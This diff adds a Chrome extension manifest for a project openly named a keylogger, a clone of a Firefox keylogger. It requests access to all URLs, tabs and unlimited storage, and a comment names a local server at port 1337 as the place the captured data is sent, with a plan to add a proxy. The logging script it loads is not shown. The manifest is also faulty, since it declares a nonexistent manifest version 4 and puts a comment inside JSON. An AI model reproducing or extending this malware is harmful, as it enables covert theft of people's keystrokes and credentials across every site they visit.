@@ -1,0 +1,16 @@
+{
+  "name": "Guss_ChromeKeyLogger",
+  "version": "1.0",
+  "manifest_version": 4,
+  "description": "Guss Firefox KeyLogger clone for Google Chrome",
+  "background": {
+    "scripts": ["src/routine.js"]
+  },
+  "permissions": [
+    "<all_urls>",
+	"http://127.0.0.1:1337/*", // remote server to send datas to. [Todo] : Proxy
+    "tabs",
+    "storage",
+    "unlimitedStorage"
+  ]
+}
